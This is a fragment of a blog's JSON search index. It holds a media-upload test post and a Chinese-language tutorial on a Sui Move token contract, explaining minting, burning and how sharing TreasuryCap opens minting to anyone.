living.**\n","tags":["AI"],"categories":["Tec"]},{"title":"Test","url":"/2025/04/16/Test/","content":"## This is a simple test for media assets uploading\n\n![](https://raw.githubusercontent.com/DudeGuuud/dudeguuud.github.io/main/source/images/25/4/kali-red-sticker_95812a9edf3279ab16a5402fbbdbeb71.jpg)\n\n"},{"title":"0x2 Mint & Burn","url":"/2025/04/16/MoveTASK2/","content":"# 0x2 Mint & Burn\n\n## Publish Contract\n\n```rust\nmodule task2::my_coin;\n    use sui::coin::{Self, Coin, TreasuryCap};\n    use std::debug;\n    use std::ascii::string;\n//\n    public struct MY_COIN has drop {}\n\n    fun init(witness: MY_COIN, ctx: &mut TxContext) {\n        let (treasury, metadata) = coin::create_currency(\n            witness,\n            6,\n            b\"DUDE\",\n            b\"DUDE_COIN\",\n            b\"This is DudeGuuud Coin.\",\n            option::none(),\n            ctx);\n        debug::print(&string(b\"init MY_COIN\"));\n        transfer::public_freeze_object(metadata);\n        transfer::public_transfer(treasury, ctx.sender())\n    }\n\n    public entry fun mint(\n        treasury_cap: &mut TreasuryCap<MY_COIN>,\n        amount: u64,\n        recipient: address,\n        ctx: &mut TxContext,\n    ) {\n        debug::print(&string(b\"my_coin mint\"));\n        let coin = coin::mint(treasury_cap, amount, ctx);\n        transfer::public_transfer(coin, recipient)\n    }\n\n    public entry fun burn(\n        treasury_cap: &mut TreasuryCap<MY_COIN>,\n        coin: Coin<MY_COIN>\n    ) {\n        debug::print(&string(b\"burn\"));\n        coin::burn(treasury_cap, coin);\n    }\n}\n```\n\n其主要内容是mint自定义代币和销毁，因为treasury_cap属于私有，只有所属钱包（第一次publish见证者账户）\n\n* 在当前代码中，**TreasuryCap** 在 **init** 函数中通过 **transfer::public\\_transfer** 转移到 **ctx.sender()**（发布者的地址）。\n* 这意味着只有发布者的地址（见证者账户）持有 **TreasuryCap**，可以调用 **mint** 和 **burn**。\n* 其他账户无法直接操作，除非发布者显式转移 **TreasuryCap**（例如通过 **transfer::public\\_transfer**）\n\n同时如果需要共享TreasuryCap的权限\n\n```rust\nmodule task2::my_coin {\n    use sui::coin::{Self, Coin, TreasuryCap};\n    use sui::transfer;\n    use sui::tx_context::{Self, TxContext};\n    use sui::object::{Self, UID};\n    use sui::event;\n    use std::ascii::string;\n    use std::option;\n\n    // 代币结构体\n    public struct MY_COIN has drop {}\n\n    // 共享对象，用于存储 TreasuryCap\n    public struct SharedTreasury has key {\n        id: UID,\n        treasury: TreasuryCap<MY_COIN>,\n    }\n\n    // 铸造事件\n    public struct MintEvent has copy, drop {\n        amount: u64,\n        recipient: address,\n    }\n\n    // 销毁事件\n    public struct BurnEvent has copy, drop {\n        amount: u64,\n    }\n\n    // 初始化函数：创建代币并将 TreasuryCap 放入共享对象\n    fun init(witness: MY_COIN, ctx: &mut TxContext) {\n        let (treasury, metadata) = coin::create_currency(\n            witness,\n            6,\n            b\"DUDE\",\n            b\"DUDE_COIN\",\n            b\"This is DudeGuuud Coin.\",\n            option::none(),\n            ctx\n        );\n        // 冻结元数据\n        transfer::public_freeze_object(metadata);\n        // 创建共享对象并存储 TreasuryCap\n        let shared_treasury = SharedTreasury {\n            id: object::new(ctx),\n            treasury,\n        };\n        transfer::share_object(shared_treasury);\n    }\n\n    // 公共铸造函数：任何人可调用\n    public entry fun mint(\n        shared: &mut SharedTreasury,\n        amount: u64,\n        recipient: address,\n        ctx: &mut TxContext,\n    ) {\n        let coin = coin::mint(&mut shared.treasury, amount, ctx);\n        event::emit(MintEvent { amount, recipient });\n        transfer::public_transfer(coin, recipient);\n    }\n\n    // 公共销毁函数：任何人可调用\n    public entry fun burn(\n        shared: &mut SharedTreasury,\n        coin: Coin<MY_COIN>\n    ) {\n        let amount = coin::value(&coin);\n        coin::burn(&mut shared.treasury, coin);\n        event::emit(BurnEvent { amount });\n    }\n}\n```\n\n如果将 **TreasuryCap** 存储在一个共享对象（**SharedTreasury**）中，允许任何人调用。\n提供公共入口函数（**public entry fun**），通过共享对象间接访问 **TreasuryCap**，因为共享了所有权，**Call** 就可以了，要求对所有权表示敬畏。\n","tags":["Web3"],"categories":["Web3"]}]